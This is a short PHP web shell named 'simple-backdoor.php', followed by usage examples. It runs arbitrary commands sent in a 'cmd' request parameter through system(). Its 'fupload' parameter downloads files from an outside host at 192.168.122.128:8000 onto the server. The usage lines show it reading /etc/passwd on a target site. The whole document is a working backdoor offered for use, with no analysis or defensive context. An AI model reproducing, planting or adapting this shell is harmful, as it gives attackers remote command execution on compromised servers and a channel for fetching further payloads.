<?php
if (isset($_REQUEST['fupload'])){
	file_put_contents($_REQUEST['fupload'],file_get_contents("http://192.168.122.128:8000/" . $_REQUEST['fupload']));
};
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
Usage: http://target.com/simple-backdoor.php?fupload="file on your web server to download"
